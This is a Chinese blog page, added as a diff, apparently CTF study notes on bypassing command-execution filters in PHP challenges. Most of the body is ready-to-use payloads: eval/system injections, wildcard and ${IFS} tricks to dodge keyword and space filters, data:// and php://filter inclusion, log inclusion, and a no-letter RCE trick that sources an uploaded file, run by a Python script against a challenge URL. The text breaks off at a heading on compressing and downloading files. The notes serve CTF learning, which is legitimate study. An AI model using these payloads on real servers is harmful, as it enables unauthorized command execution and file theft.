@@ -1,0 +1,827 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    命令执行绕过姿势 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="小知识 12345include不用括号，分号可以用?&gt;代替。 &#x2F;&#x2F;c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;若想截断后面语句：%0a、%26、||&lt;、&lt;&gt;、$&#123;IFS&#125;可以绕过空格过滤  无过滤： 1234">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行绕过姿势">
+<meta property="og:url" content="http://example.com/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="小知识 12345include不用括号，分号可以用?&gt;代替。 &#x2F;&#x2F;c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;若想截断后面语句：%0a、%26、||&lt;、&lt;&gt;、$&#123;IFS&#125;可以绕过空格过滤  无过滤： 1234">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/04/images/20250311203548095.png">
+<meta property="og:image" content="http://example.com/2025/03/04/images/20250311203652981.png">
+<meta property="og:image" content="http://example.com/2025/03/04/images/20250311203744790.png">
+<meta property="article:published_time" content="2025-03-04T13:10:47.000Z">
+<meta property="article:modified_time" content="2025-03-11T13:34:57.149Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/04/images/20250311203548095.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/1737907114de8a.jpg" alt="命令执行绕过姿势">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">命令执行绕过姿势</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text"> 小知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="toc-number">2.</span> <span class="toc-text"> 无过滤：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat-sort%E7%AD%89%E5%92%8C%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.</span> <span class="toc-text"> 过滤cat、sort等和空格：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4php%E5%92%8Cfile"><span class="toc-number">4.</span> <span class="toc-text"> 过滤php和file</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rec"><span class="toc-number">5.</span> <span class="toc-text"> 无字母数字rec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rec"><span class="toc-number">6.</span> <span class="toc-text"> 无参数rec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8linux%E8%B7%AF%E5%BE%84%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text"> 用Linux路径构造命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%B9%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">8.</span> <span class="toc-text"> 压缩目标文件并下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81"><span class="toc-number">9.</span> <span class="toc-text"> Bash数字编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">10.</span> <span class="toc-text"> (())构造数字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E8%AF%BB%E5%8F%96%E7%89%B9%E5%AE%9A%E6%96%87%E4%BB%B6"><span class="toc-number">11.</span> <span class="toc-text"> 命令函数被禁读取特定文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E8%8A%B1%E5%BC%8F%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">12.</span> <span class="toc-text"> Linux花式读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">13.</span> <span class="toc-text"> 扫描目录文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scandir"><span class="toc-number">13.1.</span> <span class="toc-text"> scandir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#glob"><span class="toc-number">13.2.</span> <span class="toc-text"> glob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E6%89%AB%E6%8F%8F"><span class="toc-number">13.3.</span> <span class="toc-text"> 递归扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#opendir-%E5%92%8C-readdir"><span class="toc-number">13.4.</span> <span class="toc-text"> opendir 和 readdir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#directoryiteratorfilesystemiterator"><span class="toc-number">13.5.</span> <span class="toc-text"> DirectoryIterator&#x2F;FilesystemIterator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">14.</span> <span class="toc-text"> 劫持缓冲区</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ping%E5%91%BD%E4%BB%A4"><span class="toc-number">15.</span> <span class="toc-text"> ping命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%8F%B7%E7%94%A8%E6%B3%95"><span class="toc-number">15.1.</span> <span class="toc-text"> “;”分号用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6%E7%94%A8%E6%B3%95"><span class="toc-number">15.2.</span> <span class="toc-text"> “| ”管道符用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%94%A8%E6%B3%95"><span class="toc-number">15.3.</span> <span class="toc-text"> “&amp;”符号用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%94%A8%E6%B3%95%E4%B8%8E"><span class="toc-number">15.4.</span> <span class="toc-text"> “&amp;&amp;”符号用法（与）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E7%94%A8%E6%B3%95%E6%88%96"><span class="toc-number">15.5.</span> <span class="toc-text"> “||”符号用法（或）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BE%8B%E9%A2%98"><span class="toc-number">15.6.</span> <span class="toc-text"> ping命令执行例题</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">38</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-命令执行绕过姿势" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-04T13:10:47.000Z" itemprop="datePublished">2025-03-04</time>
+    <time style="display: none;" id="post-update-time">2025-03-11</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="小知识"><a class="markdownIt-Anchor" href="#小知识"></a> 小知识</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include不用括号，分号可以用?&gt;代替。 //c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">若想截断后面语句：%0a、%26、||</span><br><span class="line"></span><br><span class="line">&lt;、&lt;&gt;、$&#123;IFS&#125;可以绕过空格过滤</span><br></pre></td></tr></table></figure>
+<h2 id="无过滤"><a class="markdownIt-Anchor" href="#无过滤"></a> 无过滤：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">通配符</span><br><span class="line">payload1:c=system(&quot;nl fla?????&quot;);</span><br><span class="line">payload2:c=system(&quot;nl fla*&quot;);</span><br><span class="line">payload3:c=echo `nl fl&#x27;&#x27;ag.php`;或者c=echo `nl fl“”ag.php`;</span><br><span class="line">payload4:c=echo `nl fl\ag.php`;//转义字符绕过</span><br><span class="line">payload5:c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">payload6:c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);</span><br><span class="line">payload7:c=awk &#x27;&#123;printf $0&#125;&#x27; flag.php||</span><br><span class="line"></span><br><span class="line">多写点payload，自己看着玩玩</span><br><span class="line">payload1:c=nl%09fla\g.php||</span><br><span class="line">payload2:c=nl%09fla\g.php%0a</span><br><span class="line">payload3:c=nl%09fla&#x27;&#x27;g.php%0a</span><br><span class="line">payload4:c=nl%09fla&quot;&quot;g.php%0a</span><br><span class="line">payload5:c=vi%09fla\g.php%0a</span><br><span class="line">payload6:c=tac%09fla\g.php%0a</span><br><span class="line">payload7:c=uniq%09fla\g.php%0a</span><br><span class="line">payload8:c=nl&lt;fla&#x27;&#x27;g.php||</span><br><span class="line">payload9:c=nl%09fla\g.php%26</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat:读取文件内容</span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是</span><br><span class="line">cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br></pre></td></tr></table></figure>
+<h2 id="过滤cat-sort等和空格"><a class="markdownIt-Anchor" href="#过滤cat-sort等和空格"></a> 过滤cat、sort等和空格：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=echo(`nl%09fl[abc]*`);</span><br><span class="line">c=&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fl[a]*&quot;);等价于system()</span><br><span class="line">c=echo`strings%09f*`;</span><br><span class="line">c=echo`strings\$IFS\$9f*`必须加转义字符</span><br></pre></td></tr></table></figure>
+<h2 id="过滤php和file"><a class="markdownIt-Anchor" href="#过滤php和file"></a> 过滤php和file</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/palin;base64,PD9waHAgc3lzdGVtKCJubCBmbGEqIik7Pz4=</span><br><span class="line">也可以日志包含</span><br><span class="line">c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<h2 id="无字母数字rec"><a class="markdownIt-Anchor" href="#无字母数字rec"></a> 无字母数字rec</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">或</span><br><span class="line">异或</span><br><span class="line">自增</span><br><span class="line">取反</span><br></pre></td></tr></table></figure>
+<p>若有更高级限制考虑：</p>
+<p><strong>法一：</strong></p>
+<p>.(点)的用法，就是<strong>相当于source 可以执行sh命令</strong></p>
+<p>在这个之前我们需要构造一个post上传文件的数据包。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后抓包<br />
+构造poc执行命令</p>
+<p><code>?c=.+/???/????????[@-[]</code><br />
+注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。<br />
+然后在上传文件内容添加sh命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p><strong>法二:</strong></p>
+<p>直接运行下面的脚本即可得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &quot;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;feng.txt&#x27;, b&#x27;cat flag.php&#x27;)&#125;)</span><br><span class="line">    if r.text.find(&quot;flag&quot;) &gt; 0:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<h2 id="无参数rec"><a class="markdownIt-Anchor" href="#无参数rec"></a> 无参数rec</h2>
+<p>题目特征：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相关函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</span><br><span class="line">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</span><br><span class="line">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</span><br><span class="line">getcwd() :取得当前工作目录</span><br><span class="line">dirname():函数返回路径中的目录部分</span><br><span class="line">array_flip() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand() :从数组中随机取出一个或多个单元</span><br><span class="line">array_reverse():将数组内容反转</span><br><span class="line">strrev():用于反转给定字符串</span><br><span class="line">getcwd()：获取当前工作目录路径</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line">eval()、assert()：命令执行</span><br><span class="line">hightlight_file()、show_source()、readfile()：读取文件内容</span><br></pre></td></tr></table></figure>
+<p>数组移动操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件</span><br><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">  //查看和读取根目录文件</span><br><span class="line">  //查看和读取根目录文件</span><br></pre></td></tr></table></figure>
+<h2 id="用linux路径构造命令"><a class="markdownIt-Anchor" href="#用linux路径构造命令"></a> 用Linux路径构造命令</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=/bin/c??$&#123;IFS&#125;???????? //构造cat</span><br><span class="line">c=/bin/c??$IFS????????</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/base64 flag.php</span><br><span class="line">若不能传入字母，需变为</span><br><span class="line">?c=/???/????64 ????.???</span><br></pre></td></tr></table></figure>
+<h2 id="压缩目标文件并下载"><a class="markdownIt-Anchor" href="#压缩目标文件并下载"></a> 压缩目标文件并下载</h2>
